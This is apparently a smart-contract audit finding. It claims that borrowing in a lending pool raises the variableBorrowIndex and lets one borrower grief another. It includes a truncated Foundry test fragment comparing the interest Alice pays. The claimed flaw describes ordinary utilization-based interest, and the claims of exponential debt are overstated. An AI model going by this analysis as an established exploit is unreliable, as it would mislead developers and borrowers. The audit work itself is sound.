# Exponential Influence on Borrower Debt Due to Variable Interest Rate Changes

### Summary

The protocol allows borrowers to influence the debt repayment amount of other borrowers by impacting the `variableBorrowIndex` variable. This index increases with additional borrow actions, leading to increased interest on outstanding loans. This behavior can be exploited by malicious actors or even the protocol itself for financial gain.

### Root Cause

The root cause lies in the design of the protocol's variable interest rate model, which dynamically adjusts the `variableBorrowIndex` based on the total borrowing activity in the pool. When additional borrowers take loans, the `variableBorrowIndex` rises, which directly increases the effective debt and accrued interest for all borrowers.

### Attack Path

- Borrower A: A user (victim) borrows a certain amount from the protocol and accrues interest based on the current `variableBorrowIndex`.
- Borrower B: A malicious actor borrows a large amount or repeatedly triggers borrowing actions to artificially increase the `variableBorrowIndex`.
- Impact on Borrower A: The increased `variableBorrowIndex` results in Borrower A's debt increasing exponentially over time, as their debt calculations are based on this index.

### Impact

1. **Increased Debt for Borrowers:** Honest borrowers face significantly increased repayment obligations, making borrowing unsustainable.
2. **Griefing Attack:** A malicious borrower could intentionally borrow to grief another borrower, especially one with a smaller loan amount. This could lead to the victim incurring unreasonably high interest.
3. **Protocol Exploitation:** The protocol benefits from higher interest payments, which could incentivize them to overlook or even exploit this behavior for financial gain.

    //Alice paid interest when Carol didnt borrow
    uint alicePaidInterest1 = tokenBalanceBefore - tokenBalanceAfter;

    /////////////////////////////////////////////////////////////////////////

    vm.startPrank(alice);
    contracts.poolProxy.borrow(tokenList.usdx, borrowAmount, 2, 0, alice);
    vm.stopPrank();

    //CAROL BORROW TX
    vm.startPrank(carol);
    contracts.poolProxy.borrow(tokenList.usdx, 80_000e6, 2, 0, carol);
    vm.stopPrank();

    vm.warp(block.timestamp + 10 days);

    vm.startPrank(alice);
    contracts.poolProxy.repay(tokenList.usdx, UINT256_MAX, 2, alice);
    vm.stopPrank();

    tokenBalanceAfter = usdx.balanceOf(alice);
    //Alice paid interest when Carol borrowed
    uint alicePaidInterest2 = tokenBalanceBefore - tokenBalanceAfter;

    console.log('ADDITIONS', alicePaidInterest1, alicePaidInterest2); //0.000547, 1.743102
  }
```

### Mitigation

 Decouple individual borrower interest calculations from the global `variableBorrowIndex`, possibly by introducing borrower-specific indexes.
